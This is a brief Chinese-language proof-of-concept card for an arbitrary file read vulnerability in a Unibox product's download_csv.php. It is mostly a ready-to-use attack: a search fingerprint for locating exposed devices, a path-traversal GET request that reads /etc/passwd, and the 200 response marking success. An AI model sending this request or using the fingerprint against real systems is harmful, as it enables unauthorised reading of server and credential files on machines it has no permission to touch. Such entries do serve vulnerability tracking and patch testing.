# Uniboxdownload_csv-存在任意文件读取漏洞

Uniboxdownload ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Unibox"`
- **请求**：`GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1`
- **响应特征**：200